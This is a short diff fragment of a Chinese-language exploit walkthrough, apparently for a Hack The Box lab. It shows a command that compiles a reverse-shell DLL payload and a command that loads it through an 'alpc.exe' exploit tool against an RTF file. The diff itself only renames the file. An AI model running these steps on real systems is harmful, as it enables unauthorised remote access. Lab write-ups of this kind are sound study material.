@@ -24,7 +24,7 @@ x86_64-w64-mingw32-g++ payload.cpp -o payload.dll -lws2_32 -shared
 ```
 执行命令加载dll获得反弹shell
 ```bash
-cmd /c alpc.exe payload.dll .\htb.rtf
+cmd /c alpc.exe payload.dll .\xh.rtf
 ```
 dll源代码：
 ```c
